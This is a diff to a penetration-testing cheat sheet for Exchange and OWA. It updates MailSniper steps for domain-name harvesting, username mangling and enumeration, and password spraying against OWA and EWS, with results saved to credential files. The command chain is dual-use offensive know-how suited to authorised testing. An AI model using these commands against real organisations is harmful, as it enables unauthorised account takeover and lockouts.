@@ -887,29 +887,34 @@ proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 #### Domain name discovery
 - https://github.com/dafthack/MailSniper
 ```
+Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME>
 Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
 ```
 - Internal Domain name may be found inside a SSL Certificate
-- https://github.com/dafthack/MailSniper
 
 #### Name scheme fuzzing
 - Create a username list from the OSINT
 - Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
 ```
-Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii namelist.txt
+Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii possible-usernames.txt
+```
+
+- https://gist.github.com/superkojiman/11076951
+```
+/opt/namemash.py names.txt >> possible-usernames.txt
 ```
 
 #### Username Enumeration
 - https://github.com/dafthack/MailSniper
 ```
-Invoke-UsernameHarvestOWA -Userlist <TXT> -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile potential_usernames.txt
+Invoke-UsernameHarvestOWA -Userlist possible-usernames.txt -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile domain_users.txt
 ```
 
 #### Password discovery
 - https://github.com/dafthack/MailSniper
 ```
-Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
-Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile ews-sprayed-creds.txt
 ```
 
 #### Global Address List (GAL) Extraction
